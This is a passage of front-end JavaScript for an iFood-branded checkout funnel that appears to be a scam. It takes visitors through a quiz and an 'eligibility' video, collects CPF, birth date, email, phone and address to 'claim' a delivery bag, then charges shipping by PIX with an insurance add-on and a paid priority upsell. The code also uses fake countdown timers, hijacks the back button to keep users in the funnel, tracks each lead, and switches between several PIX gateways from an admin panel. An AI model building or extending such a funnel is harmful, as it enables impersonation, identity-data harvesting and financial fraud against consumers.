            price: bumpPrice,
            title: 'Seguro Bag'
        });
        trackLead(selected ? 'orderbump_accepted' : 'orderbump_declined', {
            stage: 'orderbump',
            bump: loadBump(),
            shipping
        });

        createPixCharge(shipping, selected ? bumpPrice : 0)
            .catch((error) => {
                showToast(error.message || 'Erro ao gerar o PIX. Tente novamente.', 'error');
                if (btnAccept) btnAccept.disabled = false;
                if (btnDecline) btnDecline.disabled = false;
                if (bumpLoading) bumpLoading.classList.add('hidden');
            });
    };

    btnAccept?.addEventListener('click', () => proceedToPix(true));
    btnDecline?.addEventListener('click', () => proceedToPix(false));
}

function initUpsell() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('upsell');
    const personal = loadPersonal();
    const shippingStored = loadShipping();
    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
    const pix = loadPix();
    const offerPrice = 18.98;
    const query = new URLSearchParams(window.location.search || '');
    const paidMode = query.get('paid') === '1';

    trackLead('upsell_view', { stage: 'upsell', shipping, pix, offerPrice });

    const leadName = document.getElementById('upsell-lead-name');
    const currentFrete = document.getElementById('upsell-current-frete');
    const currentTxid = document.getElementById('upsell-current-txid');
    const btnAccept = document.getElementById('btn-upsell-accept');
    const btnSkip = document.getElementById('btn-upsell-skip');
    const loading = document.getElementById('upsell-loading');
    const subtitle = document.querySelector('.upsell-subtitle');
    const highlightRow = document.querySelector('.upsell-summary__row--highlight');
    const upsellStep = document.querySelector('.upsell-step');
    const urgencyCard = document.getElementById('upsell-urgency');
    const deliveryGrid = document.getElementById('upsell-delivery-grid');
    const timerLabel = document.getElementById('upsell-timer');
    const benefitsList = document.getElementById('upsell-benefits');

    if (leadName && personal?.name) {
        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
        leadName.textContent = firstName || 'Parceiro';
    }
    if (currentFrete) {
        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
    }
    if (currentTxid) {
        const txid = String(pix?.idTransaction || '').trim();
        currentTxid.textContent = txid ? txid.slice(-8) : '--';
    }

    const setLoading = (active) => {
        if (btnAccept) btnAccept.disabled = active;
        if (btnSkip) btnSkip.disabled = active;
        if (loading) loading.classList.toggle('hidden', !active);
    };

    const startUpsellCountdown = () => {
        if (!timerLabel) return;
        const storageKey = 'ifood_upsell_deadline_ts';
        const now = Date.now();
        const fallbackDeadline = now + (10 * 60 * 1000);
        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
        sessionStorage.setItem(storageKey, String(deadline));

        const render = () => {
            const diff = Math.max(0, deadline - Date.now());
            const totalSeconds = Math.floor(diff / 1000);
            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
            const ss = String(totalSeconds % 60).padStart(2, '0');
            timerLabel.textContent = `${mm}:${ss}`;
            if (diff <= 0 && urgencyCard) {
                urgencyCard.classList.add('upsell-urgency--expired');
            }
            return diff > 0;
        };

        render();
        const interval = window.setInterval(() => {
            const keep = render();
            if (!keep) window.clearInterval(interval);
        }, 1000);
    };

    if (paidMode) {
        if (upsellStep) {
            upsellStep.classList.add('upsell-step--paid');
        }
        if (subtitle) {
            subtitle.textContent = 'Pagamento confirmado. Sua prioridade de envio foi ativada e sua bag entra no proximo lote.';
        }
        if (highlightRow) {
            highlightRow.innerHTML = '<span>Status da prioridade</span><strong class="text-success">Confirmado</strong>';
        }
        if (btnAccept) {
            btnAccept.textContent = 'Prioridade ativa';
            btnAccept.disabled = true;
        }
        if (btnSkip) {
            btnSkip.classList.add('hidden');
        }
        if (urgencyCard) urgencyCard.classList.add('hidden');
        if (deliveryGrid) deliveryGrid.classList.add('hidden');
        if (benefitsList) {
            benefitsList.innerHTML = [
                'Recebimento prioritario confirmado para esta bag',
                'Seu pedido foi movido para o proximo lote de saida',
                'Acompanhe o rastreio para a previsao final de entrega'
            ].map((text) => `<li>${text}</li>`).join('');
        }
        trackLead('upsell_paid_view', { stage: 'upsell', shipping, pix });
        return;
    }

    startUpsellCountdown();

    btnAccept?.addEventListener('click', async () => {
        const expressShipping = {
            id: 'expresso_1dia',
            name: 'Adiantamento logistica (1 dia)',
            eta: 'Recebimento em 1 dia',
            price: offerPrice
        };

        setLoading(true);
        trackLead('upsell_accept', {
            stage: 'upsell',
            shipping: expressShipping,
            baseShipping: shipping || null,
            previousPix: pix || null
        });

        try {
            btnAccept.textContent = 'Gerando PIX da prioridade...';
            await createPixCharge(expressShipping, 0, {
                sourceStage: 'upsell',
                upsell: {
                    enabled: true,
                    kind: 'frete_1dia',
                    title: 'Prioridade de envio',
                    price: offerPrice,
                    previousTxid: String(pix?.idTransaction || '').trim()
                }
            });
        } catch (error) {
            btnAccept.textContent = 'Quero receber em 1 dia por R$ 18,98';
            showToast(error.message || 'Nao foi possivel gerar o PIX de adiantamento.', 'error');
            setLoading(false);
        }
    });

    btnSkip?.addEventListener('click', () => {
        trackLead('upsell_decline', { stage: 'upsell', shipping, pix });
        showToast('Tudo certo. Mantemos o prazo padrao da sua entrega.', 'success');
        btnSkip.disabled = true;
    });
}

function initPix() {
    const pix = loadPix();
    const shipping = loadShipping();
    const shouldAutoCreateFromOrderbumpBack = sessionStorage.getItem(STORAGE_KEYS.orderbumpBackAutoPix) === '1';
    const pixQr = document.getElementById('pix-qr');
    const pixCode = document.getElementById('pix-code');
    const pixAmount = document.getElementById('pix-amount');
    const pixEmpty = document.getElementById('pix-empty');
    const pixCard = document.getElementById('pix-card');
    const pixTimer = document.getElementById('pix-timer');
    const pixProgress = document.getElementById('pix-progress-bar');
    const pixOrderId = document.getElementById('pix-order-id');
    const pixBumpRow = document.getElementById('pix-bump-row');
    const pixBumpPrice = document.getElementById('pix-bump-price');
    const btnCopy = document.getElementById('btn-copy-pix');
    const btnCopyIcon = document.getElementById('btn-copy-pix-icon');

    if (pix) {
        sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
    }

    if (!pix && shouldAutoCreateFromOrderbumpBack && isShippingSelectionComplete(shipping)) {
        saveBump({
            selected: false,
            price: 0,
            title: 'Seguro Bag'
        });
        setStage('pix');
        createPixCharge(shipping, 0, { sourceStage: 'orderbump_back_fallback' })
            .catch((error) => {
                showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
                if (pixEmpty) pixEmpty.classList.remove('hidden');
                if (pixCard) pixCard.classList.add('hidden');
            });
        return;
    }
    if (!pix && shouldAutoCreateFromOrderbumpBack && !isShippingSelectionComplete(shipping)) {
        sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
        setStage('checkout');
        redirect('checkout.html?forceFrete=1');
        return;
    }

    if (!pix) {
        if (pixEmpty) pixEmpty.classList.remove('hidden');
        if (pixCard) pixCard.classList.add('hidden');
        return;
    }

    trackLead('pix_view', { stage: 'pix', shipping });

    if (pixAmount) pixAmount.textContent = formatCurrency(pix.amount || 0);
    if (pixBumpRow && pixBumpPrice && pix.bumpPrice) {
        pixBumpPrice.textContent = formatCurrency(pix.bumpPrice);
        pixBumpRow.classList.remove('hidden');
    }
    if (pixCode) pixCode.value = pix.paymentCode || '';

    const applyPixQrSource = (qrUrl, qrBase64) => {
        if (!pixQr) return;
        const qrSource = String(qrUrl || qrBase64 || '').trim();
        if (!qrSource) return;
        if (/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image')) {
            pixQr.src = qrSource;
        } else {
            pixQr.src = `data:image/png;base64,${qrSource}`;
        }
    };

    if (pixQr && (pix.paymentQrUrl || pix.paymentCodeBase64)) {
        applyPixQrSource(pix.paymentQrUrl, pix.paymentCodeBase64);
    }

    const handleCopy = async (button) => {
        if (!pixCode) return;
        const value = pixCode.value || '';
        if (!value) return;
        const isIcon = button && button.id === 'btn-copy-pix-icon';
        try {
            await navigator.clipboard.writeText(value);
            if (button) {
                if (isIcon) {
                    button.classList.add('pix-copy-icon--done');
                    setTimeout(() => button.classList.remove('pix-copy-icon--done'), 1600);
                } else {
                    button.textContent = 'Copiado!';
                    setTimeout(() => {
                        button.textContent = 'Copiar';
                    }, 1600);
                }
            }
        } catch (error) {
            pixCode.select();
            document.execCommand('copy');
            if (button) {
                if (isIcon) {
                    button.classList.add('pix-copy-icon--done');
                    setTimeout(() => button.classList.remove('pix-copy-icon--done'), 1600);
                } else {
                    button.textContent = 'Copiado!';
                    setTimeout(() => {
                        button.textContent = 'Copiar';
                    }, 1600);
                }
            }
        }
    };

    btnCopy?.addEventListener('click', () => handleCopy(btnCopy));
    btnCopyIcon?.addEventListener('click', () => handleCopy(btnCopyIcon));

    if (pixOrderId) {
        const id = String(pix.idTransaction || '').trim();
        pixOrderId.textContent = id ? id.slice(-6) : '—';
    }

    if (pixTimer && pixProgress) {
        const totalSeconds = 600;
        const createdAt = pix.createdAt || Date.now();
        const endTime = createdAt + totalSeconds * 1000;

        let timerId = null;
        const updateTimer = () => {
            const remaining = Math.max(0, endTime - Date.now());
            const minutes = Math.floor(remaining / 60000);
            const seconds = Math.floor((remaining % 60000) / 1000);
            pixTimer.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            const pct = (remaining / (totalSeconds * 1000)) * 100;
            pixProgress.style.width = `${Math.max(0, pct)}%`;
            if (remaining <= 0) {
                if (timerId) clearInterval(timerId);
            }
        };

        updateTimer();
        timerId = setInterval(updateTimer, 1000);
    }

    const isUpsellPix = Boolean(
        pix?.isUpsell ||
        pix?.upsell?.enabled ||
        String(pix?.shippingId || '').trim() === 'expresso_1dia' ||
        /adiantamento|prioridade|expresso/i.test(String(pix?.shippingName || ''))
    );

    let statusPollTimer = null;
    let pollingBusy = false;
    let redirectedToUpsell = false;
    let inactiveStatusShown = false;
    const sentPurchaseByTxid = new Set();

    const clearStatusPolling = () => {
        if (statusPollTimer) {
            clearInterval(statusPollTimer);
            statusPollTimer = null;
        }
    };

    const markPaidAndRedirect = (statusRaw) => {
        if (redirectedToUpsell) return;
        redirectedToUpsell = true;
        clearStatusPolling();

        savePix({
            ...pix,
            status: 'paid',
            statusRaw: String(statusRaw || 'paid'),
            paidAt: new Date().toISOString(),
            upsellPaid: isUpsellPix
        });

        const txid = String(pix?.idTransaction || '').trim();
        if (!txid || !sentPurchaseByTxid.has(txid)) {
            if (txid) sentPurchaseByTxid.add(txid);
            trackLead('pix_paid', {
                stage: 'pix',
                shipping,
                pix: {
                    ...pix,
                    idTransaction: txid,
                    statusRaw: String(statusRaw || 'paid')
                },
                amount: Number(pix?.amount || shipping?.price || 0),
                isUpsell: isUpsellPix
            });
        }

        if (isUpsellPix) {
            trackLead('upsell_pix_paid_redirect', {
                stage: 'pix',
                shipping,
                pix: {
                    txid: pix?.idTransaction || '',
                    statusRaw: String(statusRaw || 'paid')
                }
            });
            showToast('Pagamento confirmado. Prioridade ativada.', 'success');
            setStage('upsell');
            setTimeout(() => {
                redirect('upsell.html?paid=1');
            }, 900);
            return;
        }

        trackLead('pix_paid_redirect_upsell', {
            stage: 'pix',
            shipping,
            pix: {
                txid: pix?.idTransaction || '',
                statusRaw: String(statusRaw || 'paid')
            }
        });
        showToast('Pagamento confirmado. Redirecionando...', 'success');
        setStage('upsell');
        setTimeout(() => {
            redirect('upsell.html');
        }, 900);
    };

    const normalizePixStatus = (value) => {
        return String(value || '')
            .trim()
            .toLowerCase()
            .replace(/\s+/g, '_')
            .replace(/-+/g, '_');
    };

    const postPixStatusWithSessionRetry = async () => {
        const send = async () => {
            const response = await fetch('/api/pix/status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'same-origin',
                body: JSON.stringify({
                    txid: pix.idTransaction,
                    sessionId: getLeadSessionId(),
                    gateway: pix.gateway || pix.pixGateway || ''
                })
            });
            const body = await response.json().catch(() => ({}));
            return { response, body };
        };

        let attempt = await send();
        const firstError = String(attempt?.body?.error || '').trim();
        if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
            await ensureApiSession(true).catch(() => null);
            attempt = await send();
        }

        return attempt;
    };

    const pollPixStatus = async () => {
        if (pollingBusy || redirectedToUpsell) return;
        if (!pix?.idTransaction) return;
        pollingBusy = true;

        try {
            const { response: res, body: data } = await postPixStatusWithSessionRetry();
            if (!res.ok) return;

            const nextPaymentCode = String(data?.paymentCode || '').trim();
            const nextPaymentQrUrl = String(data?.paymentQrUrl || '').trim();
            const nextPaymentCodeBase64 = String(data?.paymentCodeBase64 || '').trim();
            const shouldUpdatePix =
                (!String(pix?.paymentCode || '').trim() && !!nextPaymentCode) ||
                (!String(pix?.paymentQrUrl || '').trim() && !!nextPaymentQrUrl) ||
                (!String(pix?.paymentCodeBase64 || '').trim() && !!nextPaymentCodeBase64);
            if (shouldUpdatePix) {
                if (nextPaymentCode && pixCode && !String(pixCode.value || '').trim()) {
                    pixCode.value = nextPaymentCode;
                }
                if ((nextPaymentQrUrl || nextPaymentCodeBase64) && pixQr) {
                    applyPixQrSource(nextPaymentQrUrl, nextPaymentCodeBase64);
                }
                Object.assign(pix, {
                    paymentCode: pix.paymentCode || nextPaymentCode,
                    paymentQrUrl: pix.paymentQrUrl || nextPaymentQrUrl,
                    paymentCodeBase64: pix.paymentCodeBase64 || nextPaymentCodeBase64
                });
                savePix(pix);
            }

            const status = normalizePixStatus(data?.status);
            if (status === 'paid') {
                markPaidAndRedirect(data?.statusRaw);
                return;
            }

            if (!inactiveStatusShown && (status === 'refunded' || status === 'refused')) {
                inactiveStatusShown = true;
                showToast('Esse PIX nao esta mais ativo. Gere um novo para continuar.', 'error');
            }
        } catch (_error) {
            // Ignore transient errors during status polling.
        } finally {
            pollingBusy = false;
        }
    };

    const currentStatus = normalizePixStatus(pix?.status || pix?.status_transaction || '');
    if (currentStatus === 'paid' || pix?.paidAt) {
        markPaidAndRedirect(pix?.statusRaw || pix?.status || 'paid');
        return;
    }

    const missingPixVisualData = !String(pix?.paymentCode || '').trim() && !String(pix?.paymentQrUrl || pix?.paymentCodeBase64 || '').trim();
    const pollIntervalMs = missingPixVisualData ? 2500 : 5000;

    pollPixStatus();
    statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
    window.addEventListener('pagehide', clearStatusPolling, { once: true });
    window.addEventListener('beforeunload', clearStatusPolling, { once: true });
}

function toRootRelativePath(rawUrl = '') {
    const text = String(rawUrl || '').trim();
    if (!text) return '';
    if (/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(text) || text.startsWith('#')) {
        return text;
    }
    if (text.startsWith('?')) {
        return `${window.location.pathname}${text}`;
    }

    let normalized = text.replace(/^\.\/+/, '');
    if (normalized === 'index' || normalized === 'index.html') {
        return '/';
    }
    normalized = normalized.replace(/\.html(?=$|\?)/i, '');
    return normalized.startsWith('/') ? normalized : `/${normalized}`;
}

function buildBackRedirectUrl(pageOverride) {
    const params = new URLSearchParams(window.location.search || '');
    const withDirectMode = (basePath) => {
        params.set('dc', '1');
        const query = params.toString();
        return `${basePath}${query ? `?${query}` : ''}`;
    };
    const directCheckoutUrl = () => {
        return withDirectMode('checkout.html');
    };
    const directProcessingUrl = () => {
        return withDirectMode('processando.html');
    };

    const page = pageOverride || document.body?.dataset?.page || '';
    const personal = loadPersonal();
    const address = loadAddress();
    const shipping = loadShipping();
    const pix = loadPix();
    const pixPaid = isPixPaid(pix);
    const pixPending = !!pix && !pixPaid;
    const hasPersonalCore = !!(
        personal?.name &&
        personal?.cpf &&
        personal?.birth &&
        personal?.email &&
        personal?.phone
    );
    const hasAddress = !!address;
    const hasShipping = !!shipping;
    const hasPix = !!pix;
    const hasAnyFunnelProgress = hasPersonalCore || hasAddress || hasShipping || hasPix;
    const canOpenVsl = hasPersonalCore && hasAddress;
    const mustShowVslFirst = !isVslCompleted();

    if (page === 'home' && !hasAnyFunnelProgress) {
        return 'quiz.html';
    }

    if (mustShowVslFirst) {
        return canOpenVsl ? 'processando.html' : directProcessingUrl();
    }

    if (pixPending) {
        return 'pix.html';
    }
    if (pixPaid) {
        return 'upsell.html';
    }

    switch (page) {
        case 'home':
            return 'quiz.html';
        case 'quiz':
            return hasPersonalCore ? (hasAddress ? directCheckoutUrl() : 'endereco.html') : 'dados.html';
        case 'personal':
            return hasAddress ? directCheckoutUrl() : 'endereco.html';
        case 'cep':
            return hasAddress ? directCheckoutUrl() : 'endereco.html';
        case 'processing':
            return 'sucesso.html';
        case 'success':
            return directCheckoutUrl();
        case 'checkout':
            if (shipping) return 'orderbump.html';
            return directCheckoutUrl();
        case 'orderbump':
            if (pixPending) return 'pix.html';
            if (shipping) return 'orderbump.html';
            return directCheckoutUrl();
        case 'pix':
            return pixPending ? 'pix.html' : directCheckoutUrl();
        case 'upsell':
            return 'upsell.html';
        default:
            if (pixPending) return 'pix.html';
            if (shipping) return 'orderbump.html';
            return directCheckoutUrl();
    }
}

function normalizeBackRedirectPath(rawUrl) {
    try {
        const parsed = new URL(String(rawUrl || ''), window.location.origin);
        let pathname = String(parsed.pathname || '/').replace(/\/index(?:\.html)?$/i, '/');
        pathname = pathname.replace(/\.html$/i, '');
        if (pathname.length > 1 && pathname.endsWith('/')) pathname = pathname.slice(0, -1);
        return `${pathname}${parsed.search || ''}`;
    } catch (_error) {
        return String(rawUrl || '').trim().replace(/\.html(?=$|\?)/i, '');
    }
}

function buildBackRedirectFallbackUrl(pageOverride) {
    const params = new URLSearchParams(window.location.search || '');
    const page = pageOverride || document.body?.dataset?.page || '';
    const withParams = (basePath, mutateFn) => {
        const qp = new URLSearchParams(params.toString());
        if (typeof mutateFn === 'function') mutateFn(qp);
        const query = qp.toString();
        return `${basePath}${query ? `?${query}` : ''}`;
    };

    switch (page) {
        case 'home':
            return withParams('quiz.html');
        case 'quiz':
            return withParams('dados.html');
        case 'personal':
            return withParams('endereco.html');
        case 'cep':
            return withParams('processando.html');
        case 'processing':
            return withParams('sucesso.html');
        case 'success':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
            });
        case 'checkout':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('forceFrete', '1');
                qp.set('br', String(Date.now()));
            });
        case 'orderbump':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        case 'pix':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('forceFrete', '1');
                qp.set('br', String(Date.now()));
            });
        case 'upsell':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        default:
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('br', String(Date.now()));
            });
    }
}

function buildDistinctBackRedirectUrl(pageOverride) {
    const target = toRootRelativePath(buildBackRedirectUrl(pageOverride));
    const targetPath = normalizeBackRedirectPath(target);
    const currentPath = normalizeBackRedirectPath(`${window.location.pathname}${window.location.search || ''}`);
    if (targetPath && targetPath !== currentPath) return target;
    return toRootRelativePath(buildBackRedirectFallbackUrl(pageOverride));
}

function initAdmin() {
    const loginWrap = document.getElementById('admin-login');
    const panelWrap = document.getElementById('admin-panel');
    const loginBtn = document.getElementById('admin-login-btn');
    const loginError = document.getElementById('admin-login-error');
    const passwordInput = document.getElementById('admin-password');

    const pixelEnabled = document.getElementById('pixel-enabled');
    const pixelId = document.getElementById('pixel-id');
    const pixelEventPage = document.getElementById('pixel-event-page');
    const pixelEventQuiz = document.getElementById('pixel-event-quiz');
    const pixelEventLead = document.getElementById('pixel-event-lead');
    const pixelEventCheckout = document.getElementById('pixel-event-checkout');
    const pixelEventPurchase = document.getElementById('pixel-event-purchase');
    const pixelCapiEnabled = document.getElementById('pixel-capi-enabled');
    const pixelCapiToken = document.getElementById('pixel-capi-token');
    const pixelCapiTestCode = document.getElementById('pixel-capi-test-code');

    const utmfyEnabled = document.getElementById('utmfy-enabled');
    const utmfyEndpoint = document.getElementById('utmfy-endpoint');
    const utmfyApi = document.getElementById('utmfy-api');
    const pushcutEnabled = document.getElementById('pushcut-enabled');
    const pushcutPixCreated = document.getElementById('pushcut-pix-created');
    const pushcutPixCreated2 = document.getElementById('pushcut-pix-created-2');
    const pushcutPixConfirmed = document.getElementById('pushcut-pix-confirmed');
    const pushcutPixConfirmed2 = document.getElementById('pushcut-pix-confirmed-2');
    const pushcutCreatedTitle = document.getElementById('pushcut-created-title');
    const pushcutCreatedMessage = document.getElementById('pushcut-created-message');
    const pushcutConfirmedTitle = document.getElementById('pushcut-confirmed-title');
    const pushcutConfirmedMessage = document.getElementById('pushcut-confirmed-message');
    const paymentsActiveGateway = document.getElementById('payments-active-gateway');
    const gatewayAtivushubEnabled = document.getElementById('gateway-ativushub-enabled');
    const gatewayAtivushubBaseUrl = document.getElementById('gateway-ativushub-base-url');
    const gatewayAtivushubApiKey = document.getElementById('gateway-ativushub-api-key');
    const gatewayAtivushubSellerId = document.getElementById('gateway-ativushub-seller-id');
    const gatewayAtivushubWebhookToken = document.getElementById('gateway-ativushub-webhook-token');
    const gatewayGhostspayEnabled = document.getElementById('gateway-ghostspay-enabled');
    const gatewayGhostspayBaseUrl = document.getElementById('gateway-ghostspay-base-url');
    const gatewayGhostspaySecretKey = document.getElementById('gateway-ghostspay-secret-key');
    const gatewayGhostspayCompanyId = document.getElementById('gateway-ghostspay-company-id');
    const gatewayGhostspayWebhookToken = document.getElementById('gateway-ghostspay-webhook-token');
    const gatewaySunizeEnabled = document.getElementById('gateway-sunize-enabled');
    const gatewaySunizeBaseUrl = document.getElementById('gateway-sunize-base-url');
    const gatewaySunizeApiKey = document.getElementById('gateway-sunize-api-key');
    const gatewaySunizeApiSecret = document.getElementById('gateway-sunize-api-secret');
    const gatewayParadiseEnabled = document.getElementById('gateway-paradise-enabled');
    const gatewayParadiseBaseUrl = document.getElementById('gateway-paradise-base-url');
    const gatewayParadiseApiKey = document.getElementById('gateway-paradise-api-key');
    const gatewayParadiseProductHash = document.getElementById('gateway-paradise-product-hash');
    const gatewayParadiseOrderbumpHash = document.getElementById('gateway-paradise-orderbump-hash');
    const gatewayParadiseSource = document.getElementById('gateway-paradise-source');
    const gatewayParadiseDescription = document.getElementById('gateway-paradise-description');
    const gatewayAtivushubState = document.getElementById('gateway-ativushub-state');
    const gatewayGhostspayState = document.getElementById('gateway-ghostspay-state');
    const gatewaySunizeState = document.getElementById('gateway-sunize-state');
    const gatewayParadiseState = document.getElementById('gateway-paradise-state');
    const gatewayCards = Array.from(document.querySelectorAll('[data-gateway-card]'));
    const gatewayConfigToggles = Array.from(document.querySelectorAll('[data-gateway-config-toggle]'));

    const saveBtn = document.getElementById('admin-save');
    const saveStatus = document.getElementById('admin-save-status');

    const leadsBody = document.getElementById('leads-body');
    const leadsCount = document.getElementById('leads-count');
    const leadsSearch = document.getElementById('leads-search');
    const leadsRefresh = document.getElementById('leads-refresh');
    const leadsMore = document.getElementById('leads-more');
    const leadsReconcile = document.getElementById('leads-reconcile');
    const leadsReconcileStatus = document.getElementById('leads-reconcile-status');
    const metricTotal = document.getElementById('metric-total');
    const metricPix = document.getElementById('metric-pix');
    const metricFrete = document.getElementById('metric-frete');
    const metricCep = document.getElementById('metric-cep');
    const metricUpdated = document.getElementById('metric-updated');
    const metricBase = document.getElementById('metric-base');
    const metricConvPix = document.getElementById('metric-conv-pix');
    const metricConvFrete = document.getElementById('metric-conv-frete');
    const metricConvCep = document.getElementById('metric-conv-cep');
    const metricActiveGateway = document.getElementById('metric-active-gateway');
    const metricBestGateway = document.getElementById('metric-best-gateway');
    const metricGatewayAtivushubConv = document.getElementById('metric-gateway-ativushub-conv');
    const metricGatewayAtivushubDetail = document.getElementById('metric-gateway-ativushub-detail');
    const metricGatewayGhostspayConv = document.getElementById('metric-gateway-ghostspay-conv');
    const metricGatewayGhostspayDetail = document.getElementById('metric-gateway-ghostspay-detail');
    const metricGatewaySunizeConv = document.getElementById('metric-gateway-sunize-conv');
    const metricGatewaySunizeDetail = document.getElementById('metric-gateway-sunize-detail');
    const metricGatewayParadiseConv = document.getElementById('metric-gateway-paradise-conv');
    const metricGatewayParadiseDetail = document.getElementById('metric-gateway-paradise-detail');
    const funnelPix = document.getElementById('funnel-pix');
    const funnelFrete = document.getElementById('funnel-frete');
    const funnelCep = document.getElementById('funnel-cep');
    const funnelPixValue = document.getElementById('funnel-pix-value');
    const funnelFreteValue = document.getElementById('funnel-frete-value');
    const funnelCepValue = document.getElementById('funnel-cep-value');
    const navItems = document.querySelectorAll('.admin-nav-item');
    const pagesGrid = document.getElementById('pages-grid');
    const pagesInsights = document.getElementById('pages-insights');
    const backredirectGrid = document.getElementById('backredirect-grid');
    const backredirectInsights = document.getElementById('backredirect-insights');
    const backredirectTotal = document.getElementById('backredirect-total');
    const backredirectTopPage = document.getElementById('backredirect-top-page');
    const backredirectTopRate = document.getElementById('backredirect-top-rate');
    const adminPage = document.body.getAttribute('data-admin') || '';
    const testPixelBtn = document.getElementById('admin-test-pixel');
    const testPixelStatus = document.getElementById('admin-test-pixel-status');
    const testUtmfyBtn = document.getElementById('admin-test-utmfy');
    const testUtmfyStatus = document.getElementById('admin-test-utmfy-status');
    const saleUtmfyBtn = document.getElementById('admin-sale-utmfy');
    const saleUtmfyStatus = document.getElementById('admin-sale-utmfy-status');
    const testPushcutBtn = document.getElementById('admin-test-pushcut');
    const testPushcutStatus = document.getElementById('admin-test-pushcut-status');
    const processDispatchBtn = document.getElementById('admin-process-dispatch');
    const processDispatchStatus = document.getElementById('admin-process-dispatch-status');
    const featureOrderbump = document.getElementById('feature-orderbump');

    let offset = 0;
    const limit = 50;
    let loadingLeads = false;
    const metrics = {
        total: 0,
        pix: 0,
        frete: 0,
        cep: 0,
        paid: 0,
        lastUpdated: '',
        gatewayStats: {
            ativushub: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            ghostspay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            sunize: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            paradise: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 }
        }
    };
    const funnelPageMeta = {
        home: { label: 'index.html', desc: 'Pagina inicial (entrada do funil)' },
        quiz: { label: 'quiz.html', desc: 'Perguntas de qualificacao' },
        personal: { label: 'dados.html', desc: 'Coleta de dados pessoais' },
        cep: { label: 'endereco.html', desc: 'Consulta e confirmacao de CEP' },
        processing: { label: 'processando.html', desc: 'Video + verificacao de elegibilidade' },
        success: { label: 'sucesso.html', desc: 'Aprovado e chamada para resgate' },
        checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
        orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
        pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
        upsell: { label: 'upsell.html', desc: 'Oferta de adiantamento de entrega' }
    };
    let currentSettings = null;

    const hasPixelForm = !!(
        pixelEnabled || pixelId || pixelEventPage || pixelEventQuiz || pixelEventLead || pixelEventCheckout || pixelEventPurchase ||
        pixelCapiEnabled || pixelCapiToken || pixelCapiTestCode
    );
    const hasUtmfyForm = !!(
        utmfyEnabled ||
        utmfyEndpoint ||
        utmfyApi ||
        pushcutEnabled ||
        pushcutPixCreated ||
        pushcutPixCreated2 ||
        pushcutPixConfirmed ||
        pushcutPixConfirmed2 ||
        pushcutCreatedTitle ||
        pushcutCreatedMessage ||
        pushcutConfirmedTitle ||
        pushcutConfirmedMessage
    );
    const hasPaymentsForm = !!(
        paymentsActiveGateway ||
        gatewayAtivushubEnabled ||
        gatewayAtivushubBaseUrl ||
        gatewayAtivushubApiKey ||
        gatewayAtivushubSellerId ||
        gatewayAtivushubWebhookToken ||
        gatewayGhostspayEnabled ||
        gatewayGhostspayBaseUrl ||
        gatewayGhostspaySecretKey ||
        gatewayGhostspayCompanyId ||
        gatewayGhostspayWebhookToken ||
        gatewaySunizeEnabled ||
        gatewaySunizeBaseUrl ||
        gatewaySunizeApiKey ||
        gatewaySunizeApiSecret ||
        gatewayParadiseEnabled ||
        gatewayParadiseBaseUrl ||
        gatewayParadiseApiKey ||
        gatewayParadiseProductHash ||
        gatewayParadiseOrderbumpHash ||
        gatewayParadiseSource ||
        gatewayParadiseDescription
    );
    const hasFeatureForm = !!featureOrderbump;
    const wantsLeads = !!(leadsBody || metricTotal || metricPix || metricFrete || metricCep);
    const wantsPages = !!pagesGrid;
    const wantsBackredirects = !!backredirectGrid;

    const normalizeGatewayKey = (value) => {
        const normalized = String(value || '').trim().toLowerCase();
        if (normalized === 'ghostspay') return 'ghostspay';
        if (normalized === 'sunize') return 'sunize';
        if (normalized === 'paradise') return 'paradise';
        return 'ativushub';
    };

    const gatewayLabelForUi = (gateway) => {
        const normalized = normalizeGatewayKey(gateway);
        if (normalized === 'ghostspay') return 'GhostsPay';
        if (normalized === 'sunize') return 'Sunize';
        if (normalized === 'paradise') return 'Paradise';
        return 'AtivusHUB';
    };

    const formatPercent = (value) => {
        const numeric = Number(value || 0);
        if (!Number.isFinite(numeric)) return '0%';
        const rounded = Math.round(numeric * 10) / 10;
        if (Math.abs(rounded - Math.round(rounded)) < 0.001) {
            return `${Math.round(rounded)}%`;
        }
        return `${rounded.toFixed(1)}%`;
    };

    const syncGatewaySwitchState = (input, label) => {
        if (!label) return;
        const enabled = !!input?.checked;
        label.textContent = enabled ? 'Ligado' : 'Desligado';
        label.classList.toggle('is-on', enabled);
    };

    const syncGatewaySwitches = () => {
        syncGatewaySwitchState(gatewayAtivushubEnabled, gatewayAtivushubState);
        syncGatewaySwitchState(gatewayGhostspayEnabled, gatewayGhostspayState);
        syncGatewaySwitchState(gatewaySunizeEnabled, gatewaySunizeState);
        syncGatewaySwitchState(gatewayParadiseEnabled, gatewayParadiseState);
    };

    const setCurrentGatewayCard = (gateway) => {
